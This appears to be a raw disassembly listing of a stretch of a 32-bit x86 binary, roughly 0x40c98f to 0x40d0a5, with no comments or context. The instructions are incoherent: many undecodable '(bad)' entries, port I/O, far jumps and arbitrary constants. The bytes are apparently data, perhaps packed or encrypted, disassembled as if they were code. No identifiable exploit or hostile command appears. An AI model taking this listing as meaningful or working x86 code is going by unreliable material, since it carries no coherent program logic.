  40c98f:	mov    es,WORD PTR [ebx+0x5c1b5be3]
  40c995:	rcl    DWORD PTR [ebx+0x40fc088d],0xeb
  40c99c:	adc    ebx,ebp
  40c99e:	adc    DWORD PTR [esi+0x4c],ebp
  40c9a1:	imul   ecx,esp,0xf40ad37f
  40c9a7:	add    BYTE PTR [ebx],bh
  40c9a9:	je     0x40c9ba
  40c9ab:	nop
  40c9ac:	(bad)  
  40c9ad:	out    0xff,eax
  40c9af:	or     DWORD PTR [ebp+0xd0a612],0x13
  40c9b6:	or     dh,ch
  40c9b8:	pushf  
  40c9b9:	adc    DWORD PTR [ecx-0xd],edi
  40c9bc:	out    0xf8,al
  40c9be:	in     eax,dx
  40c9bf:	(bad)  [edx-0x62]
  40c9c2:	xchg   ebx,eax
  40c9c3:	push   ss
  40c9c4:	fiadd  WORD PTR [esi+0x68]
  40c9c7:	stos   DWORD PTR es:[edi],eax
  40c9c8:	mov    al,gs:0xabdd6c65
  40c9ce:	mov    ecx,DWORD PTR [edi-0x2ca4a085]
  40c9d4:	jne    0x40c98b
  40c9d6:	enter  0xbafa,0xca
  40c9da:	scas   eax,DWORD PTR es:[edi]
  40c9db:	mov    esi,edx
  40c9dd:	call   0x44ba:0x55aec7f0
  40c9e4:	outs   dx,BYTE PTR ds:[esi]
  40c9e5:	add    dl,BYTE PTR [ebx+edx*8]
  40c9e8:	imul   BYTE PTR ds:0x1f5062e7
  40c9ee:	sti    
  40c9ef:	stc    
  40c9f0:	int    0xfd
  40c9f2:	aad    0x48
  40c9f4:	xchg   ebx,eax
  40c9f5:	arpl   WORD PTR [esi+0x62d92e0a],ax
  40c9fb:	push   eax
  40c9fc:	mov    al,ds:0x281d632c
  40ca01:	xor    ch,BYTE PTR [ebx-0x4]
  40ca04:	xor    BYTE PTR [esp+edi*1],ah
  40ca07:	rol    BYTE PTR [eax-0x78],0xaf
  40ca0b:	push   ds
  40ca0c:	and    DWORD PTR [edi-0x7e],edi
  40ca0f:	jb     0x40c9b1
  40ca11:	mov    ch,0x5f
  40ca13:	(bad)  
  40ca14:	mov    ebp,0x3b218d74
  40ca19:	sbb    DWORD PTR [eax+0x5e936d00],0xd7e34e45
  40ca23:	xchg   ebp,eax
  40ca24:	(bad)  
  40ca25:	scas   eax,DWORD PTR es:[edi]
  40ca26:	enter  0x8de0,0x10
  40ca2a:	or     eax,0x9cfc5546
  40ca2f:	xor    cl,0xec
  40ca32:	dec    ebx
  40ca33:	and    ebp,ecx
  40ca35:	sbb    DWORD PTR [eax],0xffffffe7
  40ca38:	push   edx
  40ca39:	and    ecx,DWORD PTR [eax]
  40ca3b:	or     BYTE PTR [ecx+0x487b9f03],cl
  40ca41:	pop    ebx
  40ca42:	inc    ebp
  40ca43:	push   ebx
  40ca44:	inc    esp
  40ca45:	inc    esp
  40ca46:	push   edi
  40ca47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ca48:	inc    ch
  40ca4a:	(bad)  
  40ca4b:	sub    BYTE PTR [ebp+0x7e69734e],al
  40ca51:	mov    edx,ss
  40ca53:	adc    BYTE PTR [esp+ebp*8-0x2a],dh
  40ca57:	pop    ecx
  40ca58:	mov    cl,0x6
  40ca5a:	fnstsw WORD PTR [eax]
  40ca5c:	push   edx
  40ca5d:	add    DWORD PTR [eax+0x7],ebx
  40ca60:	mov    esp,0x81f80627
  40ca65:	inc    edi
  40ca66:	out    0xf4,eax
  40ca68:	ret    
  40ca69:	les    ebx,FWORD PTR ds:0x9bcd72ce
  40ca6f:	js     0x40ca53
  40ca71:	push   esp
  40ca72:	jl     0x40ca59
  40ca74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ca75:	mov    ds:0x6d1374b4,eax
  40ca7a:	rcl    DWORD PTR [edx],0xa7
  40ca7d:	add    eax,0x2a4e58ce
  40ca82:	pop    edi
  40ca83:	push   esp
  40ca84:	mov    ebx,0x365e2a37
  40ca89:	fs loopne 0x40ca2d
  40ca8c:	xlat   BYTE PTR es:[ebx]
  40ca8e:	pusha  
  40ca8f:	stos   BYTE PTR es:[edi],al
  40ca90:	mov    BYTE PTR [esi-0x6c],bl
  40ca93:	adc    BYTE PTR [eax],cl
  40ca95:	imul   dl
  40ca97:	rcr    esi,cl
  40ca99:	sub    dl,dh
  40ca9b:	in     eax,dx
  40ca9c:	mov    ebp,DWORD PTR [esi]
  40ca9e:	xchg   esi,eax
  40ca9f:	cmp    dh,dh
  40caa1:	or     ecx,DWORD PTR [ebp+edi*2+0x1]
  40caa5:	push   ebp
  40caa6:	xchg   ebx,eax
  40caa7:	adc    al,0x79
  40caa9:	jmp    0xbc23b7cc
  40caae:	int3   
  40caaf:	inc    esp
  40cab0:	cmp    BYTE PTR [ebp+0x5],cl
  40cab3:	mul    BYTE PTR [ecx+esi*1]
  40cab6:	(bad)  
  40cab7:	leave  
  40cab8:	outs   dx,DWORD PTR ds:[esi]
  40cab9:	and    eax,0x14218c08
  40cabe:	mov    edi,0x5f35a240
  40cac3:	fcomp  DWORD PTR [ebx-0x5]
  40cac6:	xchg   esp,eax
  40cac7:	pop    ebp
  40cac8:	mov    eax,0xeb0f7d6d
  40cacd:	push   ebx
  40cace:	xor    BYTE PTR [eax+0x1],ch
  40cad1:	xchg   esi,eax
  40cad2:	lds    esp,FWORD PTR [ecx-0x59]
  40cad5:	sar    BYTE PTR [eax],1
  40cad7:	retf   
  40cad8:	jecxz  0x40ca76
  40cada:	xor    edi,DWORD PTR [edx-0x16ff8abe]
  40cae0:	pop    esi
  40cae1:	push   es
  40cae2:	push   ss
  40cae3:	into   
  40cae4:	sub    dh,ch
  40cae6:	outs   dx,BYTE PTR ds:[esi]
  40cae7:	pop    edi
  40cae8:	(bad)  
  40cae9:	or     bh,BYTE PTR [eax+0x7a]
  40caec:	ror    ah,cl
  40caee:	sar    dl,cl
  40caf0:	and    al,0xcf
  40caf2:	mov    dh,al
  40caf4:	jae    0x40ca97
  40caf6:	xchg   esp,eax
  40caf7:	xchg   ebx,eax
  40caf8:	dec    esi
  40caf9:	xchg   ecx,eax
  40cafa:	iret   
  40cafb:	mov    edx,0xc2fbf201
  40cb00:	cs enterw 0x4eeb,0x4b
  40cb06:	dec    ebx
  40cb07:	xlat   BYTE PTR ds:[ebx]
  40cb08:	js     0x40cac2
  40cb0a:	add    esp,edx
  40cb0c:	jb     0x40caa6
  40cb0e:	push   ss
  40cb0f:	pop    ebp
  40cb11:	std    
  40cb12:	popa   
  40cb13:	stc    
  40cb14:	push   ss
  40cb15:	mov    cl,0x24
  40cb17:	xor    DWORD PTR [eax+0x68],esp
  40cb1a:	or     DWORD PTR [edx+edx*4+0x1e],edx
  40cb1e:	xor    al,0xc7
  40cb20:	add    al,ah
  40cb22:	and    DWORD PTR [edx-0x6900f0b4],esi
  40cb28:	or     al,0xe2
  40cb2a:	pushf  
  40cb2b:	dec    ecx
  40cb2c:	mov    ds:0x878c094d,al
  40cb31:	popa   
  40cb32:	adc    DWORD PTR [ebp-0x46],0x46146f4b
  40cb39:	inc    ebx
  40cb3a:	sub    dh,BYTE PTR ds:0x2342e767
  40cb40:	(bad)  
  40cb41:	mov    ds:0x9b184b3a,al
  40cb46:	ds cmp eax,0x59a657e1
  40cb4c:	and    esp,esi
  40cb4e:	test   al,0x1
  40cb50:	or     DWORD PTR [ebx-0x1],0x9e47a22d
  40cb57:	adc    eax,0xadf5aa6c
  40cb5c:	jmp    0xaa53:0x8d953846
  40cb63:	cmp    dl,BYTE PTR [eax]
  40cb65:	or     ah,ah
  40cb67:	and    DWORD PTR [eax+0x48],ebx
  40cb6a:	(bad)  
  40cb6b:	mov    cl,0xf
  40cb6d:	sar    DWORD PTR ds:0xc3310f1e,cl
  40cb73:	adc    BYTE PTR [edx],dl
  40cb75:	clc    
  40cb76:	ret    0x3e58
  40cb79:	push   ds
  40cb7a:	ja     0x40cb28
  40cb7c:	dec    edx
  40cb7d:	lods   eax,DWORD PTR ds:[esi]
  40cb7e:	xor    eax,0x861b9d40
  40cb83:	jb     0x40cbc7
  40cb85:	adc    ecx,DWORD PTR [edi-0x151144cf]
  40cb8b:	xor    al,0x4d
  40cb8d:	sbb    ebx,ebx
  40cb8f:	add    edx,DWORD PTR [edx-0x5fe71469]
  40cb95:	pop    ss
  40cb96:	and    cl,BYTE PTR [ebx+0x4]
  40cb99:	pop    edx
  40cb9a:	(bad)  
  40cb9b:	ror    DWORD PTR ds:0xc2fe55a7,0x5
  40cba2:	xchg   esp,eax
  40cba3:	adc    DWORD PTR [ecx],eax
  40cba5:	add    esp,DWORD PTR [edx]
  40cba7:	scas   eax,DWORD PTR es:[edi]
  40cba8:	rol    BYTE PTR [ecx+eiz*1-0x4346d41a],1
  40cbaf:	ss xchg esi,eax
  40cbb1:	out    dx,eax
  40cbb2:	neg    BYTE PTR [eax-0x5245aba3]
  40cbb8:	xlat   BYTE PTR ds:[ebx]
  40cbb9:	les    ebp,FWORD PTR [esi]
  40cbbb:	sub    BYTE PTR [edi+edx*4+0x4c],cl
  40cbbf:	lds    ebp,FWORD PTR [ecx+0x5af0fc58]
  40cbc5:	and    al,0xfd
  40cbc7:	cli    
  40cbc8:	outs   dx,DWORD PTR ds:[esi]
  40cbc9:	cdq    
  40cbca:	cmp    al,dh
  40cbcc:	idiv   ah
  40cbce:	ss hlt 
  40cbd0:	sub    al,0xe0
  40cbd2:	aas    
  40cbd3:	pop    edx
  40cbd4:	adc    BYTE PTR [ecx+ebx*8-0x370f6365],0xf6
  40cbdc:	test   eax,0xab1be4c2
  40cbe1:	arpl   WORD PTR [edi],bp
  40cbe3:	(bad)
  40cbe6:	and    DWORD PTR [ebx],eax
  40cbe8:	sar    BYTE PTR [ebx],cl
  40cbea:	and    DWORD PTR [edi-0x64],esp
  40cbed:	repz mov eax,0x54fb6446
  40cbf3:	dec    eax
  40cbf4:	or     BYTE PTR [edx-0x55e1aa7],dl
  40cbfa:	dec    ecx
  40cbfb:	adc    BYTE PTR [ecx+0x77],bl
  40cbfe:	test   BYTE PTR [ecx+0x7836a121],ah
  40cc04:	dec    ebx
  40cc05:	setle  BYTE PTR [ecx-0x4f28bc45]
  40cc0c:	jmp    0x6127830d
  40cc11:	jmp    0x6c8e:0x66dafb44
  40cc18:	dec    esi
  40cc19:	xor    eax,0x76f1b6b9
  40cc1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cc1f:	ss mov bl,0x15
  40cc22:	sub    BYTE PTR [esi+0x15d55164],0x28
  40cc29:	sbb    ecx,DWORD PTR [eax]
  40cc2b:	or     eax,0x6fc8b235
  40cc30:	ja     0x40cbf6
  40cc32:	addr16 pusha 
  40cc34:	cmp    DWORD PTR [ecx+ebx*2],esi
  40cc37:	repz or dh,BYTE PTR [esi]
  40cc3a:	ins    BYTE PTR es:[edi],dx
  40cc3b:	fs repz ja 0x40cc01
  40cc3f:	outs   dx,DWORD PTR ds:[esi]
  40cc40:	arpl   WORD PTR [eax],bp
  40cc42:	popa   
  40cc43:	adc    bl,dl
  40cc45:	inc    eax
  40cc46:	dec    esi
  40cc47:	fbstp  TBYTE PTR [edi]
  40cc49:	ja     0x40cbfe
  40cc4b:	pop    ds
  40cc4c:	std    
  40cc4d:	xchg   esi,eax
  40cc4e:	ins    BYTE PTR es:[edi],dx
  40cc4f:	or     al,0xf1
  40cc51:	das    
  40cc52:	jo     0x40cbf9
  40cc54:	or     al,BYTE PTR [eax]
  40cc56:	and    BYTE PTR [edi+0x54],bl
  40cc59:	add    al,BYTE PTR [ecx+0x70]
  40cc5c:	sub    BYTE PTR [ebx-0x6c],bh
  40cc5f:	sub    edi,DWORD PTR [ebx-0x1b]
  40cc62:	std    
  40cc63:	rcr    DWORD PTR [esp+eiz*4-0x64],0xee
  40cc68:	pop    eax
  40cc69:	je     0x40ccad
  40cc6b:	cli    
  40cc6c:	and    edx,ebp
  40cc6e:	jmp    0x9ceb:0x25f47b3c
  40cc75:	mov    WORD PTR [ecx+0xc65d252],fs
  40cc7b:	imul   ebx,DWORD PTR [esi+0x5b],0x47dc18ef
  40cc82:	inc    DWORD PTR [esi+eax*1-0x1c]
  40cc86:	aaa    
  40cc87:	js     0x40ccb6
  40cc89:	pop    edi
  40cc8a:	sbb    ebp,eax
  40cc8c:	stos   DWORD PTR es:[edi],eax
  40cc8d:	(bad)  [eax]
  40cc8f:	or     DWORD PTR [esi-0x11],ebp
  40cc92:	call   0x67dc00a8
  40cc97:	(bad)  
  40cc98:	or     BYTE PTR [edi-0x46],al
  40cc9b:	pop    ebx
  40cc9c:	in     al,dx
  40cc9d:	lods   al,BYTE PTR ds:[esi]
  40cc9e:	ret    
  40cc9f:	sub    esi,DWORD PTR [ebx+0x1fd8351d]
  40cca5:	mov    WORD PTR [ecx-0x3c10b629],es
  40ccab:	add    eax,0x54b698be
  40ccb0:	or     DWORD PTR [ecx+0x29],esp
  40ccb3:	jb     0x40cc4a
  40ccb5:	popf   
  40ccb6:	xcrypt-ofb (bad)
  40ccb7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ccb8:	in     eax,dx
  40ccb9:	xchg   BYTE PTR [edx],bh
  40ccbb:	jo     0x40cd2f
  40ccbd:	adc    eax,0x52c6a35f
  40ccc2:	packssdw mm0,QWORD PTR [edx]
  40ccc5:	int3   
  40ccc6:	jmp    0x2b08:0xaacc605a
  40cccd:	jns    0x40cc5f
  40cccf:	pop    edi
  40ccd0:	dec    ecx
  40ccd1:	jmp    0xc28f:0xc3679e5
  40ccd8:	imul   ebp,DWORD PTR [edx-0x32],0xffffff8c
  40ccdc:	rcr    ebp,1
  40ccde:	ins    BYTE PTR es:[edi],dx
  40ccdf:	shl    DWORD PTR [edx+0x48],0x1a
  40cce3:	shl    BYTE PTR [eax],cl
  40cce5:	fistp  WORD PTR [edi+0x4f]
  40cce8:	imul   esp,edi,0x43
  40cceb:	xchg   edx,eax
  40ccec:	xor    al,0xc0
  40ccee:	and    DWORD PTR [esi+0x1e],edi
  40ccf1:	js     0x40cc9e
  40ccf3:	dec    DWORD PTR [ebx+0x44]
  40ccf6:	mov    ch,0xf
  40ccf8:	loopne 0x40cc7f
  40ccfa:	push   ds
  40ccfb:	out    dx,al
  40ccfc:	leave  
  40ccfd:	sub    cl,ch
  40ccff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cd00:	jge    0x40cd54
  40cd02:	aam    0xe
  40cd04:	jecxz  0x40cd40
  40cd06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cd07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cd08:	lds    ebp,FWORD PTR [ebx]
  40cd0a:	fstp   st(3)
  40cd0c:	adc    DWORD PTR [esp+edi*8+0x40],edx
  40cd10:	mov    WORD PTR [edx+0x36e24949],es
  40cd16:	bound  edi,QWORD PTR [esi]
  40cd18:	add    BYTE PTR [eax-0x36],bh
  40cd1b:	fild   QWORD PTR [edx+edi*2]
  40cd1e:	cdq    
  40cd1f:	shl    DWORD PTR [edi*2-0xd8b51d7],1
  40cd26:	inc    esp
  40cd27:	sbb    ah,BYTE PTR [eax-0x437a0e6b]
  40cd2d:	xor    DWORD PTR [esp+ecx*1-0xa1f9e1d],0x365a30b1
  40cd38:	cdq    
  40cd39:	or     al,0x93
  40cd3b:	arpl   bp,dx
  40cd3d:	out    0x26,eax
  40cd3f:	into   
  40cd40:	add    DWORD PTR [edx+0x3a],ecx
  40cd43:	ins    DWORD PTR es:[edi],dx
  40cd44:	ins    BYTE PTR es:[edi],dx
  40cd45:	mov    dl,0x2c
  40cd47:	xor    al,bh
  40cd49:	push   eax
  40cd4a:	sub    eax,0x74458656
  40cd4f:	imul   edi,DWORD PTR [edx+0xe],0xffffffc8
  40cd53:	pop    edx
  40cd54:	aam    0xed
  40cd56:	inc    esp
  40cd57:	pusha  
  40cd58:	mov    bh,0xb5
  40cd5a:	pop    ds
  40cd5b:	inc    ebx
  40cd5c:	pop    ebx
  40cd5d:	inc    ebx
  40cd5e:	lods   eax,DWORD PTR ds:[esi]
  40cd5f:	sahf   
  40cd60:	shl    DWORD PTR [ebp+0x31],0x16
  40cd64:	js     0x40cdd8
  40cd66:	int3   
  40cd67:	enter  0x950c,0xaf
  40cd6b:	inc    esp
  40cd6c:	cmp    edx,DWORD PTR [edi+0x36814558]
  40cd72:	fisttp DWORD PTR [ecx-0x2f]
  40cd75:	push   edi
  40cd76:	test   eax,0xaef9b1ed
  40cd7b:	sub    BYTE PTR [ebx],ah
  40cd7d:	pop    ebx
  40cd7e:	fiadd  DWORD PTR [edi+0x7d]
  40cd81:	stos   DWORD PTR es:[edi],eax
  40cd82:	std    
  40cd83:	mov    bh,0x59
  40cd85:	add    al,0x12
  40cd87:	cmp    ah,BYTE PTR [eax]
  40cd89:	add    bl,BYTE PTR [ebp-0x32]
  40cd8c:	aaa    
  40cd8d:	sbb    al,0x93
  40cd8f:	sbb    DWORD PTR [ebp-0x3a],edx
  40cd92:	shr    esp,0xf6
  40cd95:	dec    ebp
  40cd96:	push   ecx
  40cd97:	inc    edx
  40cd98:	aas    
  40cd99:	and    al,0xe3
  40cd9b:	inc    edx
  40cd9c:	mov    edx,0x992865d4
  40cda1:	add    eax,0x5029143d
  40cda6:	je     0x40cd8a
  40cda8:	adc    eax,0x41dbc3b7
  40cdad:	ror    DWORD PTR [esi+edi*2+0x5fcda5b],1
  40cdb4:	pop    ebx
  40cdb5:	jg     0x40cd79
  40cdb7:	dec    esp
  40cdb8:	inc    ecx
  40cdb9:	sub    esp,DWORD PTR [ebx-0x3ce30fa]
  40cdbf:	sbb    eax,0x1460ee12
  40cdc4:	and    edi,edi
  40cdc6:	push   esp
  40cdc7:	lods   eax,DWORD PTR ds:[esi]
  40cdc8:	(bad)  
  40cdc9:	aam    0x74
  40cdcb:	dec    esp
  40cdcc:	and    dh,BYTE PTR [esp+eax*8+0x1f]
  40cdd0:	ins    BYTE PTR es:[edi],dx
  40cdd1:	ret    0x6564
  40cdd4:	mov    ecx,0xc648b23e
  40cdd9:	(bad)  
  40cdda:	mov    edi,0x78fc3e8e
  40cddf:	repz mov al,BYTE PTR [ecx]
  40cde2:	xchg   esi,eax
  40cde3:	stos   DWORD PTR es:[edi],eax
  40cde4:	cld    
  40cde5:	cmp    bl,BYTE PTR [eax+edx*2+0x1d]
  40cde9:	mov    eax,ds:0x13dbff51
  40cdee:	pop    ecx
  40cdef:	aad    0x82
  40cdf1:	les    edi,FWORD PTR [esi]
  40cdf3:	dec    ecx
  40cdf4:	lds    ecx,FWORD PTR ds:[ecx+0x16]
  40cdf8:	and    ah,BYTE PTR [esi-0x50]
  40cdfb:	dec    eax
  40cdfc:	daa    
  40cdfd:	jo     0x40cd89
  40cdff:	sub    BYTE PTR ds:0x8157f11,bl
  40ce05:	sti    
  40ce06:	iret   
  40ce07:	jb     0x40cd8d
  40ce09:	outs   dx,BYTE PTR ds:[esi]
  40ce0a:	jns    0x40cdd2
  40ce0c:	mov    eax,ds:0x8f18a5a3
  40ce11:	add    DWORD PTR [eax+0xf],ebx
  40ce14:	retf   
  40ce15:	cli    
  40ce16:	out    dx,eax
  40ce17:	mov    ecx,DWORD PTR [ebx]
  40ce19:	popf   
  40ce1a:	and    edi,DWORD PTR [esi-0x6b0fd56b]
  40ce20:	cld    
  40ce21:	dec    eax
  40ce22:	push   es
  40ce23:	or     BYTE PTR ds:[esi+0x4c],dl
  40ce27:	xor    eax,eax
  40ce29:	mov    esi,0x8ed77c57
  40ce2e:	xchg   esi,eax
  40ce2f:	inc    edx
  40ce30:	dec    ecx
  40ce31:	fisub  WORD PTR [ecx-0x66]
  40ce34:	and    eax,ebx
  40ce36:	mov    DWORD PTR [edx+0x4c],ebp
  40ce39:	cmp    DWORD PTR [esi-0x7c5d2ebd],eax
  40ce3f:	retf   
  40ce40:	add    BYTE PTR [ecx+0x5f25a13],ah
  40ce46:	loope  0x40cdf4
  40ce48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ce49:	icebp  
  40ce4a:	xor    eax,0x49cc1bd4
  40ce4f:	mov    ds:0xde4e33c7,al
  40ce54:	jmp    0x40cec1
  40ce56:	clc    
  40ce57:	int3   
  40ce58:	push   ecx
  40ce59:	jecxz  0x40cea5
  40ce5b:	jge    0x40ce64
  40ce5d:	repnz imul ah
  40ce60:	mov    cs,WORD PTR [edi-0x31]
  40ce63:	les    ecx,FWORD PTR [edi-0x15]
  40ce66:	inc    ebp
  40ce67:	xor    DWORD PTR [ecx+edi*4],esi
  40ce6a:	inc    eax
  40ce6b:	cs fwait
  40ce6d:	dec    eax
  40ce6e:	jl     0x40ce13
  40ce70:	cmp    eax,0xfffffffc
  40ce73:	pushf  
  40ce74:	mov    WORD PTR [edx],cs
  40ce76:	sub    esi,eax
  40ce78:	arpl   WORD PTR [ecx-0x1d67dcc6],cx
  40ce7e:	jp     0x40cec5
  40ce80:	fcom   DWORD PTR [eax-0x3e]
  40ce83:	dec    ecx
  40ce84:	sub    BYTE PTR [edx],dh
  40ce86:	or     BYTE PTR [ebx+0x27f25115],ch
  40ce8c:	lahf   
  40ce8d:	ja     0x40ce7e
  40ce8f:	clc    
  40ce90:	add    cl,BYTE PTR [ebx-0x23]
  40ce93:	(bad)  
  40ce95:	inc    esi
  40ce97:	mov    dh,0x5b
  40ce99:	mov    edx,0x8af5c45a
  40ce9e:	mov    ds:0xe941218e,al
  40cea3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cea4:	mov    edx,0x3485b3d8
  40cea9:	dec    ecx
  40ceaa:	sahf   
  40ceab:	xchg   edi,eax
  40ceac:	adc    eax,0xf1761d7
  40ceb1:	pop    es
  40ceb2:	push   ebx
  40ceb3:	cwde   
  40ceb4:	(bad)  
  40ceb5:	or     dh,BYTE PTR [esi+0x1a96ca60]
  40cebb:	mov    dl,0xb3
  40cebd:	fsub   QWORD PTR ds:0x75368207
  40cec3:	out    dx,eax
  40cec4:	push   0x3
  40cec6:	bound  ecx,QWORD PTR [edi+0x3c]
  40cec9:	jb     0x40ce6d
  40cecb:	(bad)  [ecx+eax*2]
  40cece:	lahf   
  40cecf:	dec    eax
  40ced0:	inc    edx
  40ced1:	(bad)  
  40ced2:	jo     0x40ce66
  40ced4:	sbb    eax,0xbb871cfa
  40ced9:	sbb    BYTE PTR [edi],cl
  40cedb:	lea    esp,[ebx+esi*2-0x69]
  40cedf:	test   al,0x2a
  40cee1:	gs gs aad 0xad
  40cee5:	cwde   
  40cee6:	mov    esi,0x682c426a
  40ceeb:	push   cs
  40ceec:	pop    edx
  40ceed:	sub    cl,BYTE PTR [esi]
  40ceef:	vmread edx,ebx
  40cef2:	mov    cl,0x86
  40cef4:	out    dx,eax
  40cef5:	int3   
  40cef6:	or     eax,0xd98bdb71
  40cefb:	rol    BYTE PTR [ebp+0x43],1
  40cefe:	arpl   WORD PTR [ebp+0x62],sp
  40cf01:	xor    BYTE PTR [esi-0x59f9b9eb],0x13
  40cf08:	inc    eax
  40cf09:	hlt    
  40cf0a:	adc    ch,BYTE PTR [esi-0x21947431]
  40cf10:	dec    edx
  40cf11:	push   ebp
  40cf12:	retf   0xbf70
  40cf15:	ret    0x9b5f
  40cf18:	and    eax,0x65cc9b28
  40cf1d:	sbb    dl,BYTE PTR [ebx]
  40cf1f:	ss sub al,0x38
  40cf22:	jne    0x40ced9
  40cf24:	in     al,0x44
  40cf26:	push   0x1260e591
  40cf2b:	xchg   BYTE PTR [esi-0x67],dh
  40cf2e:	loopne 0x40cebd
  40cf30:	adc    ecx,DWORD PTR [eax]
  40cf32:	jbe    0x40cf90
  40cf34:	je     0x40cede
  40cf36:	test   eax,0x2882f5e9
  40cf3b:	mov    ebx,0x185a8fba
  40cf40:	fucomip st,st(6)
  40cf42:	ins    DWORD PTR es:[edi],dx
  40cf43:	shl    DWORD PTR ds:[edi],1
  40cf46:	outs   dx,BYTE PTR ss:[esi]
  40cf48:	ins    BYTE PTR es:[edi],dx
  40cf49:	out    dx,eax
  40cf4a:	mov    cl,0x36
  40cf4c:	and    cl,ah
  40cf4e:	push   ebp
  40cf4f:	adc    esp,DWORD PTR [eax+0x10435d30]
  40cf55:	push   ebx
  40cf56:	xchg   ebp,eax
  40cf57:	(bad)  
  40cf59:	lock test BYTE PTR [edx+0x66],al
  40cf5d:	xchg   BYTE PTR [ecx-0x1fc8be5c],cl
  40cf63:	dec    edx
  40cf64:	gs pop ebx
  40cf66:	aaa    
  40cf67:	les    edx,FWORD PTR [edx-0x2b]
  40cf6a:	repnz mov esi,0x83b59dde
  40cf70:	fcom   st(2)
  40cf72:	push   es
  40cf73:	(bad)  
  40cf74:	nop
  40cf75:	retf   
  40cf76:	fsub   DWORD PTR [edx]
  40cf78:	add    bh,BYTE PTR [edx]
  40cf7a:	aaa    
  40cf7b:	fistp  WORD PTR [edi]
  40cf7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cf7e:	ja     0x40cfcd
  40cf80:	add    edi,DWORD PTR ds:0x784e4734
  40cf86:	pop    edi
  40cf87:	mov    edx,DWORD PTR [edx-0x29644258]
  40cf8d:	jmp    0x40cf10
  40cf8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cf90:	int    0x7c
  40cf92:	xlat   BYTE PTR ds:[ebx]
  40cf93:	pop    esp
  40cf94:	mov    dh,cl
  40cf96:	in     al,dx
  40cf97:	jo     0x40cf50
  40cf99:	test   al,0xed
  40cf9b:	dec    ebx
  40cf9c:	fld    QWORD PTR [ebx]
  40cf9e:	jecxz  0x40cff5
  40cfa0:	scas   al,BYTE PTR es:[edi]
  40cfa1:	push   es
  40cfa2:	imul   ecx,DWORD PTR [eax-0x518eb6ee],0x61b7ef7c
  40cfac:	mov    ebx,0x70055649
  40cfb1:	lds    ecx,FWORD PTR [ecx+0x3aa3acd4]
  40cfb7:	lods   al,BYTE PTR ds:[esi]
  40cfb8:	icebp  
  40cfb9:	(bad)  
  40cfba:	pop    ebx
  40cfbb:	xchg   edi,eax
  40cfbc:	call   0xe41e:0x3e05a68
  40cfc3:	xor    edx,DWORD PTR ds:0x89728466
  40cfc9:	or     BYTE PTR [ebx-0x2324e25d],ah
  40cfcf:	cmc    
  40cfd0:	xchg   ebx,eax
  40cfd1:	fwait
  40cfd2:	pusha  
  40cfd3:	jmp    0x89b3:0x690f89eb
  40cfda:	jg     0x40cff5
  40cfdc:	fsub   DWORD PTR [esi+0x4d]
  40cfdf:	stc    
  40cfe0:	stos   DWORD PTR es:[edi],eax
  40cfe1:	imul   edx,ebp,0xedbecedb
  40cfe7:	nop
  40cfe8:	ds loop 0x40d036
  40cfeb:	stos   BYTE PTR es:[edi],al
  40cfec:	fmul   QWORD PTR [ebp+0x56e1e551]
  40cff2:	mov    ah,0xba
  40cff4:	(bad)  
  40cff5:	jg     0x40cff4
  40cff7:	enter  0x4b3b,0xdc
  40cffb:	inc    ecx
  40cffc:	jp     0x40cfc1
  40cffe:	xor    ch,BYTE PTR [edi]
  40d000:	mov    cl,0xc8
  40d002:	outs   dx,BYTE PTR ds:[esi]
  40d003:	retf   0x5158
  40d006:	inc    eax
  40d007:	dec    edx
  40d008:	pop    edx
  40d009:	sub    DWORD PTR ds:[eax],edx
  40d00c:	push   ecx
  40d00d:	push   ss
  40d00e:	int3   
  40d00f:	xor    al,BYTE PTR [ecx+ebp*8]
  40d012:	pop    edi
  40d013:	ins    DWORD PTR es:[edi],dx
  40d014:	(bad)  
  40d015:	sbb    DWORD PTR [eax-0x1193ddaa],ebx
  40d01b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d01c:	je     0x40cff7
  40d01e:	mov    esp,0x9e11b5d6
  40d023:	out    dx,al
  40d024:	sub    edx,0xb2fbe80e
  40d02a:	call   0xfef5:0x76ea7eaf
  40d031:	rcr    BYTE PTR [edi-0x5cdff7e7],0xc5
  40d038:	sbb    al,0xfe
  40d03a:	lods   eax,DWORD PTR ds:[esi]
  40d03b:	ret    0x5ee5
  40d03e:	dec    ebp
  40d03f:	enter  0xdbc8,0x3
  40d043:	jnp    0x40d0ad
  40d045:	mov    al,ds:0x9554feeb
  40d04a:	xor    DWORD PTR [ebp-0x69],ebx
  40d04d:	dec    esp
  40d04e:	jle    0x40d038
  40d050:	es (bad) 
  40d052:	iret   
  40d053:	push   cs
  40d054:	rcl    BYTE PTR [edi-0x7],cl
  40d057:	xor    dl,ah
  40d059:	or     al,ah
  40d05b:	ret    
  40d05c:	sbb    bh,bh
  40d05e:	push   cs
  40d05f:	std    
  40d060:	add    al,BYTE PTR [ecx-0x1f]
  40d063:	cmp    bh,BYTE PTR [edi]
  40d065:	ss mov bh,0xb7
  40d068:	icebp  
  40d069:	or     dl,BYTE PTR ds:0x3a127fd5
  40d06f:	push   ecx
  40d070:	inc    esp
  40d071:	or     al,0xa5
  40d073:	iret   
  40d074:	loopne 0x40d0f4
  40d076:	push   0x3c834875
  40d07b:	inc    ecx
  40d07c:	or     DWORD PTR [edi+0x57],ecx
  40d07f:	sbb    eax,0xb7790827
  40d084:	cmp    eax,0x74a4e34b
  40d089:	pop    edx
  40d08a:	pop    eax
  40d08b:	or     BYTE PTR [edx],al
  40d08d:	dec    eax
  40d08e:	iret   
  40d08f:	lods   eax,DWORD PTR ds:[esi]
  40d090:	or     eax,DWORD PTR [ecx+0x70]
  40d093:	mov    ebx,0x66847031
  40d098:	push   ebp
  40d099:	sbb    eax,0xae97c0e9
  40d09e:	mov    ah,ch
  40d0a0:	jl     0x40d02a
  40d0a2:	aam    0xfd
  40d0a4:	scas   eax,DWORD PTR es:[edi]
  40d0a5:	mov    ecx,0x635804e8
